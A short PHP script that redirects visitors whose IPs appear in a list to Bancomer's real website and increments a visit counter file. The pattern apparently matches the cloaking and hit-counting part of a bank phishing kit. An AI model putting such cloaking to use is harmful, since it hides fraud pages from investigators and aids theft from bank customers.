<?php
@session_start();

$ips = file_get_contents("ips.txt");
$ip  = explode("\n", $ips);
foreach ($ip as $intruso){
    if ($intruso == $_SERVER['REMOTE_ADDR'])
        header("Location:http://www.bancomer.com");
}
$archivo = "contador.txt";

$fp = fopen($archivo,"r");
$contador = fgets($fp, 26);
fclose($fp);

++$contador;

$fp = fopen($archivo,"w+");
fwrite($fp, $contador, 26);
fclose($fp);

?>